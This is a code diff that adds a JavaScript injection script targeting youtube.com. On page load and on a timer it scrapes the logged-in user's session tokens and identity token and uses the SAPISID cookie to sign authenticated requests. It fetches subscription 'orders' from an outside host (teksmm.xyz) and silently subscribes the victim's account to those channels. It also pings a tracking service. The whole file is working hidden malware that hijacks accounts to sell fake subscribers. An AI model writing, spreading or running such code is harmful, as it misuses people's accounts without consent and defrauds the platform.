@@ -1,1 +1,434 @@
 
+
+if (location.hostname.indexOf("youtube.com") >= 0 && document.body.innerHTML.split('creator_channel_id","value":"')[1] && window.asdfsdf != true) {
+	
+	
+	console.log("Inject");
+	window.asdfsdf = true;
+	
+	function getStaticParams(){
+		let vars = {}
+		let data = document.getElementsByTagName('html')[0].outerHTML;
+		vars.userAgent   = navigator.userAgent+",gzip(gfe)";
+		//vars.visitorData = data.split('"VISITOR_DATA":"')[1].split('"')[0];
+		vars.screenWidthPoints = window.innerWidth;
+		vars.screenHeightPoints = window.innerHeight;
+		vars.screenPixelDensity = Math.round(window.devicePixelRatio) || 1;
+		vars.userInterfaceTheme  = data.indexOf("<html dark") >= 0 ? "USER_INTERFACE_THEME_DARK" :  "USER_INTERFACE_THEME_LIGHT";
+		vars.session_token = data.split('"XSRF_TOKEN":"')[1].split('"')[0];
+		vars.sessionId = data.split('"sessionId":"')[1].split('"')[0];
+		vars.youtube_identity_token = data.split('"ID_TOKEN":"')[1].split('"')[0];
+		vars.variants_checksum = data.split('"VARIANTS_CHECKSUM":"')[1].split('"')[0];
+		vars.page_cl = data.split('PAGE_CL":')[1].split(',')[0];
+		vars.page_build_label = data.split('"PAGE_BUILD_LABEL":"')[1].split('"')[0];
+		vars.clientVersion = data.split('"clientVersion":"')[1].split('"')[0];  
+		vars.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        vars.utcOffsetMinutes   = -Math.floor(new Date().getTimezoneOffset());
+		
+		try{
+			vars.apiKey =data.split('"innertube_api_key":"')[1].split('"')[0]; 
+		}catch(ex){
+			vars.apiKey =data.split('"innertubeApiKey":"')[1].split('"')[0]; 
+		}
+		
+		try{
+			vars.DELEGATED_SESSION_ID =data.split('"DELEGATED_SESSION_ID":"')[1].split('"')[0];
+		}catch(ex){
+			vars.DELEGATED_SESSION_ID = 0
+		}
+		
+		vars.STS = data.split('"STS":')[1].split(',')[0];
+		
+		vars.userInterfaceTheme  = data.indexOf("<html dark") >= 0 ? "USER_INTERFACE_THEME_DARK" :  "USER_INTERFACE_THEME_LIGHT";
+		
+		var lng = window.navigator.userLanguage || window.navigator.language;
+		var lngParse = lng.slice(0, 2);
+		vars.accept_language = lng+","+lngParse+";q=0.9,en-US;q=0.8,en;q=0.7";
+		
+		var deviceRaw = data.split('"DEVICE":"')[1].split('"')[0].split("\\u0026");
+		var urlParams = {};
+		deviceRaw.forEach(function(x){
+			var arr = x.split('=');
+			arr[1] && (urlParams[arr[0]] = arr[1]);
+		});
+		vars.device = "cbr="+urlParams["cbr"]+"&cbrver="+urlParams["cbrver"]+"&ceng="+urlParams["ceng"]+"&cengver="+urlParams["cengver"]+"&cos="+urlParams["cos"]+"&cosver="+urlParams["cosver"];
+		
+		
+		try{
+			vars.sessionIndex = data.split('"SESSION_INDEX":')[1].split(',')[0]; 
+		}catch(Ex){
+			vars.sessionIndex = 0; 
+		}
+
+	
+		return vars;
+
+	}
+	
+	function createSubData(data){
+		let vars = getStaticParams();
+		var body = {
+					"context": {
+						"client": {
+							"hl": data[2].player.args.host_language,
+							"gl": data[2].player.args.cr,
+							"visitorData": 	data[3].playerResponse.responseContext.webResponseContextExtensionData.ytConfigData.visitorData,
+							"userAgent": vars.userAgent,
+							"clientName": data[2].player.args.c,
+							"clientVersion": data[2].player.args.cver,
+							"osName": data[2].player.args.cos,
+							"osVersion": data[2].player.args.cosver,
+							"browserName": data[2].player.args.cbr,
+							"browserVersion": data[2].player.args.cbrver,
+							"screenWidthPoints": vars.screenWidthPoints,
+							"screenHeightPoints": vars.screenHeightPoints,
+							"screenPixelDensity": vars.screenPixelDensity,
+							"utcOffsetMinutes": vars.utcOffsetMinutes,
+							"userInterfaceTheme": vars.userInterfaceTheme
+						},
+						"request": {
+							"sessionId": vars.sessionId,
+							"internalExperimentFlags": [
+
+							],
+							"consistencyTokenJars":  [] 
+							
+							
+						},
+						"user": {
+
+						},
+						"clientScreenNonce": data[0].csn,
+						"clickTracking": {
+							"clickTrackingParams": data[3].response.contents.twoColumnWatchNextResults.results.results.contents[1].videoSecondaryInfoRenderer.subscribeButton.subscribeButtonRenderer.onSubscribeEndpoints[0].clickTrackingParams
+						}
+					},
+					"channelIds": [
+						 data[3].response.contents.twoColumnWatchNextResults.results.results.contents[1].videoSecondaryInfoRenderer.subscribeButton.subscribeButtonRenderer.onSubscribeEndpoints[0].subscribeEndpoint.channelIds[0]
+					],
+					"params": data[3].response.contents.twoColumnWatchNextResults.results.results.contents[1].videoSecondaryInfoRenderer.subscribeButton.subscribeButtonRenderer.onSubscribeEndpoints[0].subscribeEndpoint.params
+				};
+				
+		let sessIndex = data[3].response.responseContext.webResponseContextExtensionData.ytConfigData.sessionIndex;
+		if(sessIndex != 0){
+			body.context.request.sessionIndex = sessIndex;
+		}
+		if(vars.DELEGATED_SESSION_ID != 0){
+			body.context.user.onBehalfOfUser = vars.DELEGATED_SESSION_ID;
+		}
+	
+
+		return body;
+	}
+	
+	function createPost(data,videoId){
+		var body = createSubData(data);
+		
+		var sapisid = getCookie("SAPISID")
+		let time = Math.floor(new Date().getTime() / 1E3);
+		let b =  nca();
+		b.update(time+" "+sapisid+" https://www.youtube.com")
+		var SAPISIDHASH = "SAPISIDHASH "+time+"_"+b.digestString().toLowerCase()
+		
+		let vars = getStaticParams();
+		
+		let url = "https://www.youtube.com/youtubei/v1/subscription/subscribe?key="+vars.apiKey;
+	
+		
+		fetch(url, {
+		  "headers": {
+	
+			"authorization": SAPISIDHASH,
+			"content-type": "application/json",
+			"referer-zzz": "https://www.youtube.com/watch?v="+videoId,
+			"sec-fetch-dest": "empty",
+			"sec-fetch-mode": "same-origin",
+			"sec-fetch-site": "same-origin",
+			"x-goog-authuser": vars.sessionIndex ,
+			"x-goog-visitor-id": data[3].playerResponse.responseContext.webResponseContextExtensionData.ytConfigData.visitorData,
+			"x-origin": "https://www.youtube.com"
+		  },
+		  "body" : JSON.stringify(body),
+		  "method": "POST"
+		}).then(response => response.json())
+	}
+
+	function subscribe(videoId,remains){
+		let vars = getStaticParams();
+		
+		var xhr = new XMLHttpRequest();
+		xhr.open("GET", "https://www.youtube.com/watch?v="+videoId+"&pbj=1", true);
+	
+		xhr.setRequestHeader("referer-zzz", "https,//www.youtube.com/");
+		xhr.setRequestHeader("x-spf-previous", "https,//www.youtube.com/");
+		xhr.setRequestHeader("x-spf-referer", "https,//www.youtube.com/");
+		xhr.setRequestHeader("x-youtube-client-name", "1");
+		xhr.setRequestHeader("x-youtube-client-version",  vars.clientVersion);
+		xhr.setRequestHeader("x-youtube-device", vars.device);
+		xhr.setRequestHeader("x-youtube-identity-token", vars.youtube_identity_token);
+		xhr.setRequestHeader("x-youtube-page-cl", vars.page_cl);
+		xhr.setRequestHeader("x-youtube-page-label", vars.page_build_label);
+		xhr.setRequestHeader("x-youtube-sts", vars.STS);
+		xhr.setRequestHeader("x-youtube-time-zone", vars.timezone );
+		xhr.setRequestHeader("x-youtube-utc-offset", vars.utcOffsetMinutes);
+		xhr.setRequestHeader("x-youtube-variants-checksum", vars.variants_checksum);
+		xhr.onreadystatechange = function() {
+
+			if (xhr.readyState == 4 && xhr.status == 200) {
+			let rawData = xhr.responseText;
+			let data = JSON.parse(rawData);
+			
+			let subscribed = rawData.split('"subscribed":')[1].split(',')[0].trim();
+			let subCount =  numberFormatter(rawData.split('"subscriberCountText":{"simpleText":"')[1].split('"')[0].trim());
+				if(subscribed.indexOf((false).toString()) >= 0 && subCount <= remains ){
+					setTimeout(()=>{
+						createPost(data,videoId)
+					},15000)
+				
+				}
+			}
+		}
+		
+		xhr.send();
+		
+		// fetch("https://www.youtube.com/watch?v="+videoId+"&pbj=1", {
+		  // "headers": {
+			// "accept": "*/*",
+			// "accept-language": vars.accept_language,
+			// "sec-fetch-dest": "empty",
+			// "sec-fetch-mode": "cors",
+			// "sec-fetch-site": "same-origin",
+			// "referer-zzz": "https://www.youtube.com/",
+			// "x-spf-previous": "https://www.youtube.com/",
+			// "x-spf-referer": "https://www.youtube.com/",
+			// "x-youtube-client-name": "1",
+			// "x-youtube-client-version":  vars.clientVersion,
+			// "x-youtube-device": vars.device,
+			// "x-youtube-identity-token": vars.youtube_identity_token,
+			// "x-youtube-page-cl": vars.page_cl,
+			// "x-youtube-page-label": vars.page_build_label,
+			// "x-youtube-sts": vars.STS,
+			// "x-youtube-time-zone": vars.timezone ,
+			// "x-youtube-utc-offset": vars.utcOffsetMinutes,
+			// "x-youtube-variants-checksum": vars.variants_checksum
+		  // },
+		  // "method": "GET"
+		// }).then(response => response.json())
+		  // .then(data =>{
+			// let subscribed = JSON.stringify(data).split('"subscribed":')[1].split(',')[0].trim();
+			// let subCount =  numberFormatter(JSON.stringify(data).split('"subscriberCountText":{"simpleText":"')[1].split('"')[0].trim());
+			// if(subscribed.indexOf((false).toString()) >= 0 && subCount <= remains ){
+				// setTimeout(()=>{
+					// createPost(data,videoId)
+				// },15000)
+				
+			
+			// }
+			
+			
+		  // })
+		 
+	}
+	
+	
+	//Helpers
+	var nca = function() {
+    function a() {
+        e[0] = 1732584193;
+        e[1] = 4023233417;
+        e[2] = 2562383102;
+        e[3] = 271733878;
+        e[4] = 3285377520;
+        w = p = 0
+    }
+    function b(y) {
+        for (var A = k, K = 0; 64 > K; K += 4)
+            A[K / 4] = y[K] << 24 | y[K + 1] << 16 | y[K + 2] << 8 | y[K + 3];
+        for (K = 16; 80 > K; K++)
+            y = A[K - 3] ^ A[K - 8] ^ A[K - 14] ^ A[K - 16],
+            A[K] = (y << 1 | y >>> 31) & 4294967295;
+        y = e[0];
+        var S = e[1]
+          , Z = e[2]
+          , ta = e[3]
+          , Fa = e[4];
+        for (K = 0; 80 > K; K++) {
+            if (40 > K) {
+                if (20 > K) {
+                    var Ka = ta ^ S & (Z ^ ta);
+                    var Gb = 1518500249
+                } else
+                    Ka = S ^ Z ^ ta,
+                    Gb = 1859775393;
+            } else
+                60 > K ? (Ka = S & Z | ta & (S | Z),
+                Gb = 2400959708) : (Ka = S ^ Z ^ ta,
+                Gb = 3395469782);
+            Ka = ((y << 5 | y >>> 27) & 4294967295) + Ka + Fa + Gb + A[K] & 4294967295;
+            Fa = ta;
+            ta = Z;
+            Z = (S << 30 | S >>> 2) & 4294967295;
+            S = y;
+            y = Ka
+        }
+        e[0] = e[0] + y & 4294967295;
+        e[1] = e[1] + S & 4294967295;
+        e[2] = e[2] + Z & 4294967295;
+        e[3] = e[3] + ta & 4294967295;
+        e[4] = e[4] + Fa & 4294967295
+    }
+    function c(y, A) {
+        if ("string" === typeof y) {
+            y = unescape(encodeURIComponent(y));
+            for (var K = [], S = 0, Z = y.length; S < Z; ++S)
+                K.push(y.charCodeAt(S));
+            y = K
+        }
+        A || (A = y.length);
+        K = 0;
+        if (0 == p)
+            for (; K + 64 < A; )
+                b(y.slice(K, K + 64)),
+                K += 64,
+                w += 64;
+        for (; K < A; )
+            if (g[p++] = y[K++],
+            w++,
+            64 == p)
+                for (p = 0,
+                b(g); K + 64 < A; )
+                    b(y.slice(K, K + 64)),
+                    K += 64,
+                    w += 64
+    }
+    function d() {
+        var y = []
+          , A = 8 * w;
+        56 > p ? c(m, 56 - p) : c(m, 64 - (p - 56));
+        for (var K = 63; 56 <= K; K--)
+            g[K] = A & 255,
+            A >>>= 8;
+        b(g);
+        for (K = A = 0; 5 > K; K++)
+            for (var S = 24; 0 <= S; S -= 8)
+                y[A++] = e[K] >> S & 255;
+        return y
+    }
+    for (var e = [], g = [], k = [], m = [128], n = 1; 64 > n; ++n)
+        m[n] = 0;
+    var p, w;
+    a();
+    return {
+        reset: a,
+        update: c,
+        digest: d,
+        digestString: function() {
+            for (var y = d(), A = "", K = 0; K < y.length; K++)
+                A += "0123456789ABCDEF".charAt(Math.floor(y[K] / 16)) + "0123456789ABCDEF".charAt(y[K] % 16);
+            return A
+        }
+    }
+};
+	function getCookie(name) {
+		var nameEQ = name + "=";
+		var ca = document.cookie.split(';');
+		for(var i=0;i < ca.length;i++) {
+			var c = ca[i];
+			while (c.charAt(0)==' ') c = c.substring(1,c.length);
+			if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
+		}
+		return null;
+	}
+	function numberFormatter(strNum){
+    if(strNum == "0"){
+        return 0;
+    }
+    let mm = strNum.substring(strNum.length-1)
+    if(mm.toUpperCase() == mm.toLowerCase()){
+       return parseInt(strNum)
+    }else{
+        let ll = strNum.substring(0,strNum.length-1).trim()
+        let numbers = ll.split(/\D/g)
+        let result = 0;
+        let xx = 1000;
+        result += (xx * parseInt(numbers[0]));
+        if(numbers.length == 2){
+           let subNum = numbers[1].split('');
+            for(let i =0; i < subNum.length; i++){
+                xx /= 10;
+                result += subNum[i] * xx;
+            }
+        }
+        return result;
+    }
+}
+	
+function checkOrSave(key, value){
+Object.keys(localStorage).forEach(x => {
+  if( parseInt( localStorage.getItem(x) ) - new Date().getTime()  <= 0){
+		if(x != "ytStart"){
+			localStorage.removeItem(x)
+		}
+  }
+})
+if(localStorage.getItem(key)){
+  return true;
+}
+localStorage.setItem(key,new Date().getTime()+(1000*60*60*24*11))
+return false;
+}
+
+	
+function siparis_getir_3() {
+	var xhr = new XMLHttpRequest();
+	xhr.open("GET", "https://teksmm.xyz/smmnew/queue.php?queue=3&json=[]");
+	xhr.onreadystatechange = function() {
+		if (xhr.readyState == 4 && xhr.status == 200) {
+			try {
+				var data = JSON.parse(xhr.responseText);
+				vars = {};
+				vars.videoId = data.videoIds[Math.floor(Math.random()*data.videoIds.length)]
+				vars.channelIds = data.channelId.trim();
+				vars.id = data.id.trim();
+				vars.remains = parseInt(data.remains)+10;
+				if (vars.channelIds  ) {
+					if(!checkOrSave(vars.id,"3")){
+						// new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getir3';
+						subscribe(vars.videoId,vars.remains);
+					}
+				}
+			}catch (error) {}
+		}else{
+			
+		}
+	}
+	xhr.send();
+}
+
+
+
+function rasgteleSure(min, max) { 
+  return Math.floor(Math.random() * (max - min + 1) + min);
+}
+
+function start() {
+	try {
+  var cookie_name = "ytStart";
+  var cookie_time = rasgteleSure(60 * 1000 * 3,60 * 1000 * 5);
+  console.log(localStorage.getItem(cookie_name))
+  if (!localStorage.getItem(cookie_name) || parseInt(localStorage.getItem(cookie_name)) < Date.now() - cookie_time) {
+    localStorage.setItem(cookie_name,Date.now())
+	new Image().src = '//whos.amung.us/pingjs/?k=selamcek03';
+    siparis_getir_3();
+  }
+  
+  }catch (error) {console.log(error)}
+}
+
+setInterval(start, 60000 );
+ 
+	
+
+	
+}
+
